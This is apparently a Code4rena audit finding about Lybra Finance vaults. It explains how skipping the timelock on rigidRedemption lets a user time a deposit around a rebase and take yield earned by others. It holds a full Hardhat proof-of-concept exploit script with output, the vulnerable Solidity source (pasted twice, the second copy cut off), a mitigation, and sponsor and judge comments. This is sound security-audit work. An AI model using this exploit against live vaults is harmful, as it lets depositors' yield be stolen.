{
  "Title": "[M-15] Lack of timelock on `rigidRedemption`, enables to steal yield from other users",
  "Content": "\nThe withdraw function of the `LybraEUSDVaultBase` vaults, uses a time softlock to prevent users from hopping in and out of the protocol; to gain access to the yield generated by other users and then leave right away (by charging a small percentage from the withdrawn amount).\n\nThe same measure isn't applied to `rigidRedemptions`, which enable a user to withdraw most of the underlying assets at any time after deposit. This enables a user to deposit into the pool right before a rebase is about to happen, get access to the yield generated by other users and leave by calling `rigidRedemption` and withdraw on the tokens left by `rigidRedemption` (the amount charged on the leftovers assets, can be outbalanced by the yield).\n\nTherefore, a malicious user to get access to yield that they didn't generate, effectively stealing it from others. The amount that the user will get access to will vary based on the deposited amounts.\n\n### Proof of Concept\n\nThis issue involves 3 functions:\n\n- `withdraw(address onBehalfOf, uint256 amount)` from the `LybraEUSDVaultBase` [contract](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L98), which internally calls `checkWithdrawal(address user, uint256 amount)` to check that 3 days has passed after deposit and charges the user otherways:\n\n    ```\n    withdrawal = block.timestamp - 3 days >= depositedTime[user] ? amount : (amount * 999) / 1000;\n    ```\n\n- `rigidRedemption(address provider, uint256 eusdAmount)` from the `LybraEUSDVaultBase` [contract](<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L232>), which enables a user to withdraw the full borrowed amount getting back a 1:1 ratio of collateral (the rest will be left in the vault and can be withdrawn).\n    ```    \n    * @notice Choose a Redemption Provider, Rigid Redeem `eusdAmount` of EUSD and get 1:1 value of stETH\n    * Emits a `RigidRedemption` event.\n    ```\n\n- `excessIncomeDistribution(uint256 stETHAmount)` from the `LybraStETHDepositVault` [contract](<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L62>), which enables anyone to buy the stETH, generated by lido to the vault (or by charging on withdraws and `rigidRedemptions`), for EUSD, allocating them to EUSD holders through rebasing.\n    ```\n    * @notice When stETH balance increases through LSD or other reasons, the excess income is sold for EUSD, allocated to EUSD holders through rebase mechanism.\n    * Emits a `LSDValueCaptured` event.\n    ```\nScenario:\n\n1. Users use the protocol as intended depositing stETH which will generate a yield.\n2. Bob calls the rebase mechanism (`excessIncomeDistribution`).\n3. Alice sees the rebase and preceeds it with a deposit (either by frontruinng or by pure prediction, since stETH rebase happens daily at a fixed time).\n4. Right after Bob's rebase gets executed, Alice calls `rigidRedemption` (to repay the full debt) followed by a withdraw (to get the difference out), getting most of the stETH back and some EUSD.\n5. Since the stETH charged by the withdraw function is left in the vault, if they want, Alice can now call `excessIncomeDistribution` to get the tokens back, using the EUSD recived by rebasing, and leaving with slightly more stETH and some EUSD, that they got for free; leaving 0 debts and 0 assets deposited, having left their tokens in the vault for a few seconds.\n\nHere is an hardhat script that shows the scenario above in javascript (each step is highlighted in the comments and it will print all the balances to the console).\nBefore running it you'll have to install the `'@openzeppelin/test-helpers'` package:\n\n<details>\n\n    const {ethers} = require(\"hardhat\");\n    const {\n            constants,\n            expectRevert,\n        } = require('@openzeppelin/test-helpers');//questo va installato\n    const { expect } = require(\"chai\");\n    async function main() {\n      this.accounts = await ethers.getSigners()\n            this.owner = this.accounts[0].address\n            console.log(\"Deployng contracts...\")\n            const goerliEndPoint = '0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23'\n            const goerliChainId = 10121\n\n            const oracle = await ethers.getContractFactory(\"mockChainlink\")\n            const stETH = await ethers.getContractFactory(\"stETHMock\")\n            const EUSDMock = await ethers.getContractFactory(\"EUSD\")\n            const configurator = await ethers.getContractFactory(\"Configurator\")\n            const LybraStETHDepositVault = await ethers.getContractFactory(\"LybraStETHDepositVault\")\n            const GovernanceTimelock = await ethers.getContractFactory(\"GovernanceTimelock\")\n            const EUSDMiningIncentives = await ethers.getContractFactory(\"EUSDMiningIncentives\")\n            const esLBRBoost = await ethers.getContractFactory(\"esLBRBoost\")\n            const LBR = await ethers.getContractFactory(\"LBR\")\n            const esLBR = await ethers.getContractFactory(\"esLBR\")\n            const PeUSDMainnet = await ethers.getContractFactory(\"PeUSDMainnet\")\n            const ProtocolRewardsPool = await ethers.getContractFactory(\"ProtocolRewardsPool\")\n            const mockCurvePool = await ethers.getContractFactory(\"mockCurve\")//\n            const mockUSDC = await ethers.getContractFactory(\"mockUSDC\")\n            const lbrOracleMock = await ethers.getContractFactory(\"mockLBRPriceOracle\")//\n            \n            this.oracle = await oracle.deploy()\n\n            this.lbrOracleMock = await lbrOracleMock.deploy()\n\n            this.stETHMock = await stETH.deploy()\n\n            this.GovernanceTimelock = await GovernanceTimelock.deploy(1,[this.owner],[this.owner],this.owner);\n\n\n            this.esLBRBoost = await esLBRBoost.deploy()\n\n            this.usdc = await mockUSDC.deploy()\n\n            this.mockCurvePool = await mockCurvePool.deploy()\n\n            this.configurator = await configurator.deploy(this.GovernanceTimelock.address, this.mockCurvePool.address)\n\n\n            this.LBR = await LBR.deploy(this.configurator.address, 8, goerliEndPoint)\n      \n            this.esLBR = await esLBR.deploy(this.configurator.address)\n\n\n            this.EUSDMock = await EUSDMock.deploy(this.configurator.address)\n\n            await this.configurator.initToken(this.EUSDMock.address, constants.ZERO_ADDRESS)//\n\n            this.EUSDMiningIncentives = await EUSDMiningIncentives.deploy(this.configurator.address, this.esLBRBoost.address, this.oracle.address, this.lbrOracleMock.address)\n\n            this.ProtocolRewardsPool = await ProtocolRewardsPool.deploy(this.configurator.address)\n\n            this.stETHVault = await LybraStETHDepositVault.deploy(this.configurator.address, this.stETHMock.address, this.oracle.address)\n\n            this.PeUSDMainnet = await PeUSDMainnet.deploy(this.configurator.address, 8, goerliEndPoint)\n\n            await this.mockCurvePool.setToken(this.EUSDMock.address, this.usdc.address)\n            await this.configurator.setMintVault(this.stETHVault.address, true);\n            await this.configurator.setPremiumTradingEnabled(true);\n            await this.configurator.setMintVaultMaxSupply(this.stETHVault.address, ethers.utils.parseEther(\"10000000000\"));\n            await this.configurator.setBorrowApy(this.stETHVault.address, 200);\n            await this.configurator.setEUSDMiningIncentives(this.EUSDMiningIncentives.address)\n\n            await this.EUSDMiningIncentives.setToken(this.LBR.address, this.esLBR.address)\n            await this.ProtocolRewardsPool.setTokenAddress(this.esLBR.address, this.LBR.address, this.esLBRBoost.address);\n\n\n\n\n\n\n\n            ///////////////////////////////////////////POC////////////////////////////////////////////////////////////\n\n            //random users, mints stETH and deposits them (only 1 in the script for simplicity)\n            await stETHMock.connect(accounts[2]).submit(accounts[2].address, {value:ethers.utils.parseEther(\"1000\") });\n            await stETHMock.connect(accounts[2]).approve(this.stETHVault.address, ethers.constants.MaxUint256)\n            await stETHVault.connect(accounts[2]).depositAssetToMint(await stETHMock.balanceOf(accounts[2].address),ethers.utils.parseEther(\"10000\"));\n           \n            //time passes generathing stETH yield\n            await network.provider.send(\"evm_increaseTime\", [6500])\n            await network.provider.send(\"evm_mine\")\n\n            //user 3 balances before exploit \n            await stETHMock.connect(accounts[3]).submit(accounts[3].address, {value:ethers.utils.parseEther(\"100\") });\n            //timestamp\n            const blockNumBefore = await ethers.provider.getBlockNumber();\n            const blockBefore = await ethers.provider.getBlock(blockNumBefore);\n            const timestampBefore = blockBefore.timestamp;\n            console.log(\"Timestamp before the exploit: \" + timestampBefore)\n            //stETH balance\n            const sthETHBalanceBefore = await stETHMock.balanceOf(accounts[3].address)\n            console.log(\"sthETHBalance before the exploit: \" +sthETHBalanceBefore)\n            //EUSD shares\n            const EUSDSharesBefore = await this.EUSDMock.sharesOf(accounts[3].address)\n            console.log(\"EUSD shares before the exploit: \" + EUSDSharesBefore)\n            //EUSD balance \n            const EUSDBalanceBefore = await this.EUSDMock.balanceOf(accounts[3].address)\n            console.log(\"EUSD balance before the exploit: \" + EUSDBalanceBefore)\n            //Deposited assets\n            const depositedAssetBefore = await stETHVault.depositedAsset(accounts[3].address)\n            console.log(\"Deposited assets before the exploit: \" + depositedAssetBefore)\n            //Borrowed amount\n            const borrowedBefore = await stETHVault.getBorrowedOf(accounts[3].address)\n            console.log(\"Borrowed amount before the exploit: \" + borrowedBefore)\n\n            //right before somene calls the rebasde function (excessIncomeDistribution) user3 deposits into the vault\n            const depositedAmount = ethers.utils.parseEther(\"1.0\")\n            await stETHMock.connect(accounts[3]).approve(this.stETHVault.address, ethers.constants.MaxUint256)\n            await stETHVault.connect(accounts[3]).depositAssetToMint(depositedAmount,ethers.utils.parseEther(\"1000.0\"))\n\n            //someone call excessIncomeDistribution causing the rebase to distribute the yield to users\n            await stETHVault.connect(accounts[2]).excessIncomeDistribution(ethers.utils.parseEther(\"0.01\"))\n            console.log(\"Alice deposits before rebase and withdraws immediately after\")\n\n            //right after the rebase user3 redeems all the necessary tokens\n            await this.configurator.connect(accounts[3]).becomeRedemptionProvider(true)\n            await stETHVault.connect(accounts[3]).rigidRedemption(accounts[3].address, await stETHVault.getBorrowedOf(accounts[3].address))\n            await stETHVault.connect(accounts[3]).withdraw(accounts[3].address,await stETHVault.depositedAsset(accounts[3].address));\n            await stETHVault.connect(accounts[3]).excessIncomeDistribution(ethers.utils.parseEther(\"0.01\"))\n\n           \n            //user3 balances after exploit\n            //timestamp\n            const blockNumAfter = await ethers.provider.getBlockNumber();\n            const blockAfter = await ethers.provider.getBlock(blockNumAfter);\n            const timestampAfter = blockAfter.timestamp;\n            console.log(\"Timestamp after the exploit: \" + timestampAfter)\n            //stETH balance\n            const sthETHBalanceAfter = await stETHMock.balanceOf(accounts[3].address)\n            console.log(\"sthETH balance after the exploit: \" +sthETHBalanceAfter)\n            //EUSD shares\n            const EUSDSharesAfter = await this.EUSDMock.sharesOf(accounts[3].address)\n            console.log(\"EUSD shares after the exploit: \" + EUSDSharesAfter)\n            //EUSD balance \n            const EUSDBalanceAfter = await this.EUSDMock.balanceOf(accounts[3].address)\n            console.log(\"EUSD balance after the exploit: \" + EUSDBalanceAfter)\n            //Deposited assets\n            const depositedAssetAfter = await stETHVault.depositedAsset(accounts[3].address)\n            console.log(\"Deposited assets after the exploit: \" + depositedAssetAfter)\n            //Borrowed amount\n            const borrowedAfter = await stETHVault.getBorrowedOf(accounts[3].address)\n            console.log(\"Borrowed amount after the exploit: \" + borrowedAfter)\n\n            expect(sthETHBalanceAfter > sthETHBalanceBefore)\n\n    }\n\n    // We recommend this pattern to be able to use async/await everywhere\n    // and properly handle errors.\n    main().catch((error) => {\n      console.error(error);\n      process.exitCode = 1;\n    });\n\nIt will log the following content to the console:\n\n    Deployng contracts...\n    Timestamp before the exploit: 1688138231\n    sthETHBalance before the exploit: 99999999999999999999\n    EUSD shares before the exploit: 0\n    EUSD balance before the exploit: 0\n    Deposited assets before the exploit: 0\n    Borrowed amount before the exploit: 0\n    Alice deposits before rebase and withdraws immediately after\n    Timestamp after the exploit: 1688138238\n    sthETH balance after the exploit: 100000319476188886835\n    EUSD shares after the exploit: 320852235386255949\n    EUSD balance after the exploit: 321329019285990239\n    Deposited assets after the exploit: 0\n    Borrowed amount after the exploit: 0\n\n</details>\n\n### Recommended Mitigation Steps\n\nThe same timelock logic that is applied to the withdraw function could be applied to `rigidRedemption`, making this type of interaction unprofitable.\n\n### Assessed type\n\nTiming\n\n**[LybraFinance disputed and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/290#issuecomment-1635597408):**\n > There is a 0.5% fee for redemptions, which offsets the potential gains from such operations.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/290#issuecomment-1650757930):**\n > @LybraFinance - can you comment on why you believe the test is not showing that fee outweighing the benefit?\n\n**[LybraFinance confirmed and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/290#issuecomment-1655277926):**\n > Because in step three, there are additional fees involved when the user performs a withdraw, so it's not possible to completely avoid losses. This situation does exist, but we consider it a moderate-risk issue.\n\n**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-06-lybra-findings/issues/290#issuecomment-1655652712)**\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-06-lybra",
  "Code": [
    {
      "filename": "contracts/lybra/pools/base/LybraEUSDVaultBase.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity ^0.8.17;\n\nimport \"../../interfaces/IEUSD.sol\";\nimport \"../../interfaces/Iconfigurator.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ninterface LbrStakingPool {\n    function notifyRewardAmount(uint256 amount) external;\n}\n\ninterface IPriceFeed {\n    function fetchPrice() external returns (uint256);\n}\n\nabstract contract LybraEUSDVaultBase {\n    IEUSD public immutable EUSD;\n    IERC20 public immutable collateralAsset;\n    Iconfigurator public immutable configurator;\n    uint256 public immutable badCollateralRatio = 150 * 1e18;\n    IPriceFeed immutable etherOracle;\n\n    uint256 public totalDepositedAsset;\n    uint256 public lastReportTime;\n    uint256 public poolTotalEUSDCirculation;\n\n    mapping(address => uint256) public depositedAsset;\n    mapping(address => uint256) borrowed;\n    uint8 immutable vaultType = 0;\n    uint256 public feeStored;\n    mapping(address => uint256) depositedTime;\n\n    event DepositEther(address indexed onBehalfOf, address asset, uint256 etherAmount, uint256 assetAmount, uint256 timestamp);\n\n    event DepositAsset(address indexed onBehalfOf, address asset, uint256 amount, uint256 timestamp);\n\n    event WithdrawAsset(address sponsor, address asset, address indexed onBehalfOf, uint256 amount, uint256 timestamp);\n    event Mint(address sponsor, address indexed onBehalfOf, uint256 amount, uint256 timestamp);\n    event Burn(address sponsor, address indexed onBehalfOf, uint256 amount, uint256 timestamp);\n    event LiquidationRecord(address provider, address keeper, address indexed onBehalfOf, uint256 eusdamount, uint256 liquidateEtherAmount, uint256 keeperReward, bool superLiquidation, uint256 timestamp);\n    event LSDValueCaptured(uint256 stETHAdded, uint256 payoutEUSD, uint256 discountRate, uint256 timestamp);\n    event RigidRedemption(address indexed caller, address indexed provider, uint256 eusdAmount, uint256 collateralAmount, uint256 timestamp);\n    event FeeDistribution(address indexed feeAddress, uint256 feeAmount, uint256 timestamp);\n\n    constructor(address _collateralAsset, address _etherOracle, address _configurator) {\n        collateralAsset = IERC20(_collateralAsset);\n        configurator = Iconfigurator(_configurator);\n        EUSD = IEUSD(configurator.getEUSDAddress());\n        etherOracle = IPriceFeed(_etherOracle);\n    }\n\n    /**\n     * @notice Allowing direct deposits of ETH, the pool may convert it into the corresponding collateral during the implementation.\n     * While depositing, it is possible to simultaneously mint eUSD for oneself.\n     * Emits a `DepositEther` event.\n     *\n     * Requirements:\n     * - `mintAmount` Send 0 if doesn't mint EUSD\n     * - msg.value Must be higher than 0.\n     */\n    function depositEtherToMint(uint256 mintAmount) external payable virtual;\n\n    /**\n     * @notice Deposit collateral and allow minting eUSD for oneself.\n     * Emits a `DepositAsset` event.\n     *\n     * Requirements:\n     * - `assetAmount` Must be higher than 0.\n     * - `mintAmount` Send 0 if doesn't mint EUSD\n     */\n    function depositAssetToMint(uint256 assetAmount, uint256 mintAmount) external virtual {\n        require(assetAmount >= 1 ether, \"Deposit should not be less than 1 stETH.\");\n\n        bool success = collateralAsset.transferFrom(msg.sender, address(this), assetAmount);\n        require(success, \"TF\");\n\n        totalDepositedAsset += assetAmount;\n        depositedAsset[msg.sender] += assetAmount;\n        depositedTime[msg.sender] = block.timestamp;\n\n        if (mintAmount > 0) {\n            _mintEUSD(msg.sender, msg.sender, mintAmount, getAssetPrice());\n        }\n        emit DepositAsset(msg.sender, address(collateralAsset), assetAmount, block.timestamp);\n    }\n\n    /**\n     * @notice Withdraw collateral assets to an address\n     * Emits a `WithdrawEther` event.\n     *\n     * Requirements:\n     * - `onBehalfOf` cannot be the zero address.\n     * - `amount` Must be higher than 0.\n     *\n     * @dev Withdraw stETH. Check user’s collateral ratio after withdrawal, should be higher than `safeCollateralRatio`\n     */\n    function withdraw(address onBehalfOf, uint256 amount) external virtual {\n        require(onBehalfOf != address(0), \"TZA\");\n        require(amount > 0, \"ZERO_WITHDRAW\");\n        require(depositedAsset[msg.sender] >= amount, \"Withdraw amount exceeds deposited amount.\");\n        totalDepositedAsset -= amount;\n        depositedAsset[msg.sender] -= amount;\n\n        uint256 withdrawal = checkWithdrawal(msg.sender, amount);\n\n        collateralAsset.transfer(onBehalfOf, withdrawal);\n        if (borrowed[msg.sender] > 0) {\n            _checkHealth(msg.sender, getAssetPrice());\n        }\n        emit WithdrawAsset(msg.sender, address(collateralAsset), onBehalfOf, withdrawal, block.timestamp);\n    }\n\n    function checkWithdrawal(address user, uint256 amount) internal view returns (uint256 withdrawal) {\n        withdrawal = block.timestamp - 3 days >= depositedTime[user] ? amount : (amount * 999) / 1000;\n    }\n\n    /**\n     * @notice The mint amount number of EUSD is minted to the address\n     * Emits a `Mint` event.\n     *\n     * Requirements:\n     * - `onBehalfOf` cannot be the zero address.\n     * - `amount` Must be higher than 0. Individual mint amount shouldn't surpass 10% when the circulation reaches 10_000_000\n     */\n    function mint(address onBehalfOf, uint256 amount) external {\n        require(onBehalfOf != address(0), \"MINT_TO_THE_ZERO_ADDRESS\");\n        require(amount > 0, \"ZERO_MINT\");\n        _mintEUSD(msg.sender, onBehalfOf, amount, getAssetPrice());\n    }\n\n    /**\n     * @notice Burn the amount of EUSD and payback the amount of minted EUSD\n     * Emits a `Burn` event.\n     * Requirements:\n     * - `onBehalfOf` cannot be the zero address.\n     * - `amount` Must be higher than 0.\n     * @dev Calling the internal`_repay`function.\n     */\n    function burn(address onBehalfOf, uint256 amount) external {\n        require(onBehalfOf != address(0), \"BURN_TO_THE_ZERO_ADDRESS\");\n        _repay(msg.sender, onBehalfOf, amount);\n    }\n\n    /**\n     * @notice When overallCollateralRatio is above 150%, Keeper liquidates borrowers whose collateral ratio is below badCollateralRatio, using EUSD provided by Liquidation Provider.\n     *\n     * Requirements:\n     * - onBehalfOf Collateral Ratio should be below badCollateralRatio\n     * - collateralAmount should be less than 50% of collateral\n     * - provider should authorize Lybra to utilize EUSD\n     * @dev After liquidation, borrower's debt is reduced by collateralAmount * etherPrice, collateral is reduced by the collateralAmount corresponding to 110% of the value. Keeper gets keeperRatio / 110 of Liquidation Reward and Liquidator gets the remaining stETH.\n     */\n    function liquidation(address provider, address onBehalfOf, uint256 assetAmount) external virtual {\n        uint256 assetPrice = getAssetPrice();\n        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / borrowed[onBehalfOf];\n        require(onBehalfOfCollateralRatio < badCollateralRatio, \"Borrowers collateral ratio should below badCollateralRatio\");\n\n        require(assetAmount * 2 <= depositedAsset[onBehalfOf], \"a max of 50% collateral can be liquidated\");\n        require(EUSD.allowance(provider, address(this)) > 0, \"provider should authorize to provide liquidation EUSD\");\n        uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;\n\n        _repay(provider, onBehalfOf, eusdAmount);\n        uint256 reducedAsset = (assetAmount * 11) / 10;\n        totalDepositedAsset -= reducedAsset;\n        depositedAsset[onBehalfOf] -= reducedAsset;\n        uint256 reward2keeper;\n        if (provider == msg.sender) {\n            collateralAsset.transfer(msg.sender, reducedAsset);\n        } else {\n            reward2keeper = (reducedAsset * configurator.vaultKeeperRatio(address(this))) / 110;\n            collateralAsset.transfer(provider, reducedAsset - reward2keeper);\n            collateralAsset.transfer(msg.sender, reward2keeper);\n        }\n        emit LiquidationRecord(provider, msg.sender, onBehalfOf, eusdAmount, reducedAsset, reward2keeper, false, block.timestamp);\n    }\n\n    /**\n     * @notice When overallCollateralRatio is below badCollateralRatio, borrowers with collateralRatio below 125% could be fully liquidated.\n     * Emits a `LiquidationRecord` event.\n     *\n     * Requirements:\n     * - Current overallCollateralRatio should be below badCollateralRatio\n     * - `onBehalfOf`collateralRatio should be below 125%\n     * @dev After Liquidation, borrower's debt is reduced by collateralAmount * etherPrice, deposit is reduced by collateralAmount * borrower's collateralRatio. Keeper gets a liquidation reward of `keeperRatio / borrower's collateralRatio\n     */\n    function superLiquidation(address provider, address onBehalfOf, uint256 assetAmount) external virtual {\n        uint256 assetPrice = getAssetPrice();\n        require((totalDepositedAsset * assetPrice * 100) / poolTotalEUSDCirculation < badCollateralRatio, \"overallCollateralRatio should below 150%\");\n        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / borrowed[onBehalfOf];\n        require(onBehalfOfCollateralRatio < 125 * 1e18, \"borrowers collateralRatio should below 125%\");\n        require(assetAmount <= depositedAsset[onBehalfOf], \"total of collateral can be liquidated at most\");\n        uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;\n        if (onBehalfOfCollateralRatio >= 1e20) {\n            eusdAmount = (eusdAmount * 1e20) / onBehalfOfCollateralRatio;\n        }\n        require(EUSD.allowance(provider, address(this)) >= eusdAmount, \"provider should authorize to provide liquidation EUSD\");\n\n        _repay(provider, onBehalfOf, eusdAmount);\n\n        totalDepositedAsset -= assetAmount;\n        depositedAsset[onBehalfOf] -= assetAmount;\n        uint256 reward2keeper;\n        if (msg.sender != provider && onBehalfOfCollateralRatio >= 1e20 + configurator.vaultKeeperRatio(address(this)) * 1e18) {\n            reward2keeper = ((assetAmount * configurator.vaultKeeperRatio(address(this))) * 1e18) / onBehalfOfCollateralRatio;\n            collateralAsset.transfer(msg.sender, reward2keeper);\n        }\n        collateralAsset.transfer(provider, assetAmount - reward2keeper);\n\n        emit LiquidationRecord(provider, msg.sender, onBehalfOf, eusdAmount, assetAmount, reward2keeper, true, block.timestamp);\n    }\n\n    /**\n     * @notice When stETH balance increases through LSD or other reasons, the excess income is sold for EUSD, allocated to EUSD holders through rebase mechanism.\n     * Emits a `LSDistribution` event.\n     *\n     * *Requirements:\n     * - stETH balance in the contract cannot be less than totalDepositedAsset after exchange.\n     * @dev Income is used to cover accumulated Service Fee first.\n     */\n    function excessIncomeDistribution(uint256 payAmount) external virtual;\n\n    /**\n     * @notice Choose a Redemption Provider, Rigid Redeem `eusdAmount` of EUSD and get 1:1 value of stETH\n     * Emits a `RigidRedemption` event.\n     *\n     * *Requirements:\n     * - `provider` must be a Redemption Provider\n     * - `provider`debt must equal to or above`eusdAmount`\n     * @dev Service Fee for rigidRedemption `redemptionFee` is set to 0.5% by default, can be revised by DAO.\n     */\n    function rigidRedemption(address provider, uint256 eusdAmount) external virtual {\n        require(configurator.isRedemptionProvider(provider), \"provider is not a RedemptionProvider\");\n        require(borrowed[provider] >= eusdAmount, \"eusdAmount cannot surpass providers debt\");\n        uint256 assetPrice = getAssetPrice();\n        uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider];\n        require(providerCollateralRatio >= 100 * 1e18, \"provider's collateral ratio should more than 100%\");\n        _repay(msg.sender, provider, eusdAmount);\n        uint256 collateralAmount = (((eusdAmount * 1e18) / assetPrice) * (10000 - configurator.redemptionFee())) / 10000;\n        depositedAsset[provider] -= collateralAmount;\n        totalDepositedAsset -= collateralAmount;\n        collateralAsset.transfer(msg.sender, collateralAmount);\n        emit RigidRedemption(msg.sender, provider, eusdAmount, collateralAmount, block.timestamp);\n    }\n\n    /**\n     * @notice Mints eUSD tokens for a user.\n     * @param _provider The provider's address.\n     * @param _onBehalfOf The user's address.\n     * @param _mintAmount The amount of eUSD tokens to be minted.\n     * @param _assetPrice The current collateral asset price.\n     * @dev Mints eUSD tokens for the specified user, updates the total supply and borrowed balance,\n     * refreshes the mint reward for the provider, checks the health of the provider,\n     * and emits a Mint event.\n     * Requirements:\n     * The total supply plus mint amount must not exceed the maximum supply allowed for the vault.\n     * The provider must have sufficient borrowing capacity to mint the specified amount.\n     */\n    function _mintEUSD(address _provider, address _onBehalfOf, uint256 _mintAmount, uint256 _assetPrice) internal virtual {\n        require(poolTotalEUSDCirculation + _mintAmount <= configurator.mintVaultMaxSupply(address(this)), \"ESL\");\n        try configurator.refreshMintReward(_provider) {} catch {}\n        borrowed[_provider] += _mintAmount;\n\n        EUSD.mint(_onBehalfOf, _mintAmount);\n        _saveReport();\n        poolTotalEUSDCirculation += _mintAmount;\n        _checkHealth(_provider, _assetPrice);\n        emit Mint(msg.sender, _onBehalfOf, _mintAmount, block.timestamp);\n    }\n\n    /**\n     * @notice Burn _provideramount EUSD to payback minted EUSD for _onBehalfOf.\n     *\n     * @dev Refresh LBR reward before reducing providers debt. Refresh Lybra generated service fee before reducing totalEUSDCirculation.\n     */\n    function _repay(address _provider, address _onBehalfOf, uint256 _amount) internal virtual {\n        uint256 amount = borrowed[_onBehalfOf] >= _amount ? _amount : borrowed[_onBehalfOf];\n\n        EUSD.burn(_provider, amount);\n        try configurator.refreshMintReward(_onBehalfOf) {} catch {}\n\n        borrowed[_onBehalfOf] -= amount;\n        _saveReport();\n        poolTotalEUSDCirculation -= amount;\n        emit Burn(_provider, _onBehalfOf, amount, block.timestamp);\n    }\n\n    /**\n     * @dev Get USD value of current collateral asset and minted EUSD through price oracle / Collateral asset USD value must higher than safe Collateral Ratio.\n     */\n    function _checkHealth(address _user, uint256 _assetPrice) internal view {\n        if (((depositedAsset[_user] * _assetPrice * 100) / borrowed[_user]) < configurator.getSafeCollateralRatio(address(this))) revert(\"collateralRatio is Below safeCollateralRatio\");\n    }\n\n    function _saveReport() internal {\n        feeStored += _newFee();\n        lastReportTime = block.timestamp;\n    }\n\n    function _newFee() internal view returns (uint256) {\n        return (poolTotalEUSDCirculation * configurator.vaultMintFeeApy(address(this)) * (block.timestamp - lastReportTime)) / (86400 * 365) / 10000;\n    }\n\n    /**\n     * @dev Return USD value of current ETH through Liquity PriceFeed Contract.\n     */\n    function _etherPrice() internal returns (uint256) {\n        return etherOracle.fetchPrice();\n    }\n\n    function getBorrowedOf(address user) external view returns (uint256) {\n        return borrowed[user];\n    }\n\n    function getPoolTotalEUSDCirculation() external view returns (uint256) {\n        return poolTotalEUSDCirculation;\n    }\n\n    function getAsset() external view virtual returns (address) {\n        return address(collateralAsset);\n    }\n\n    function getVaultType() external pure returns (uint8) {\n        return vaultType;\n    }\n\n    function getAssetPrice() public virtual returns (uint256);\n}"
    },
    {
      "filename": "contracts/lybra/pools/base/LybraEUSDVaultBase.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity ^0.8.17;\n\nimport \"../../interfaces/IEUSD.sol\";\nimport \"../../interfaces/Iconfigurator.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ninterface LbrStakingPool {\n    function notifyRewardAmount(uint256 amount) external;\n}\n\ninterface IPriceFeed {\n    function fetchPrice() external returns (uint256);\n}\n\nabstract contract LybraEUSDVaultBase {\n    IEUSD public immutable EUSD;\n    IERC20 public immutable collateralAsset;\n    Iconfigurator public immutable configurator;\n    uint256 public immutable badCollateralRatio = 150 * 1e18;\n    IPriceFeed immutable etherOracle;\n\n    uint256 public totalDepositedAsset;\n    uint256 public lastReportTime;\n    uint256 public poolTotalEUSDCirculation;\n\n    mapping(address => uint256) public depositedAsset;\n    mapping(address => uint256) borrowed;\n    uint8 immutable vaultType = 0;\n    uint256 public feeStored;\n    mapping(address => uint256) depositedTime;\n\n    event DepositEther(address indexed onBehalfOf, address asset, uint256 etherAmount, uint256 assetAmount, uint256 timestamp);\n\n    event DepositAsset(address indexed onBehalfOf, address asset, uint256 amount, uint256 timestamp);\n\n    event WithdrawAsset(address sponsor, address asset, address indexed onBehalfOf, uint256 amount, uint256 timestamp);\n    event Mint(address sponsor, address indexed onBehalfOf, uint256 amount, uint256 timestamp);\n    event Burn(address sponsor, address indexed onBehalfOf, uint256 amount, uint256 timestamp);\n    event LiquidationRecord(address provider, address keeper, address indexed onBehalfOf, uint256 eusdamount, uint256 liquidateEtherAmount, uint256 keeperReward, bool superLiquidation, uint256 timestamp);\n    event LSDValueCaptured(uint256 stETHAdded, uint256 payoutEUSD, uint256 discountRate, uint256 timestamp);\n    event RigidRedemption(address indexed caller, address indexed provider, uint256 eusdAmount, uint256 collateralAmount, uint256 timestamp);\n    event FeeDistribution(address indexed feeAddress, uint256 feeAmount, uint256 timestamp);\n\n    constructor(address _collateralAsset, address _etherOracle, address _configurator) {\n        collateralAsset = IERC20(_collateralAsset);\n        configurator = Iconfigurator(_configurator);\n        EUSD = IEUSD(configurator.getEUSDAddress());\n        etherOracle = IPriceFeed(_etherOracle);\n    }\n\n    /**\n     * @notice Allowing direct deposits of ETH, the pool may convert it into the corresponding collateral during the implementation.\n     * While depositing, it is possible to simultaneously mint eUSD for oneself.\n     * Emits a `DepositEther` event.\n     *\n     * Requirements:\n     * - `mintAmount` Send 0 if doesn't mint EUSD\n     * - msg.value Must be higher than 0.\n     */\n    function depositEtherToMint(uint256 mintAmount) external payable virtual;\n\n    /**\n     * @notice Deposit collateral and allow minting eUSD for oneself.\n     * Emits a `DepositAsset` event.\n     *\n     * Requirements:\n     * - `assetAmount` Must be higher than 0.\n     * - `mintAmount` Send 0 if doesn't mint EUSD\n     */\n    function depositAssetToMint(uint256 assetAmount, uint256 mintAmount) external virtual {\n        require(assetAmount >= 1 ether, \"Deposit should not be less than 1 stETH.\");\n\n        bool success = collateralAsset.transferFrom(msg.sender, address(this), assetAmount);\n        require(success, \"TF\");\n\n        totalDepositedAsset += assetAmount;\n        depositedAsset[msg.sender] += assetAmount;\n        depositedTime[msg.sender] = block.timestamp;\n\n        if (mintAmount > 0) {\n            _mintEUSD(msg.sender, msg.sender, mintAmount, getAssetPrice());\n        }\n        emit DepositAsset(msg.sender, address(collateralAsset), assetAmount, block.timestamp);\n    }\n\n    /**\n     * @notice Withdraw collateral assets to an address\n     * Emits a `WithdrawEther` event.\n     *\n     * 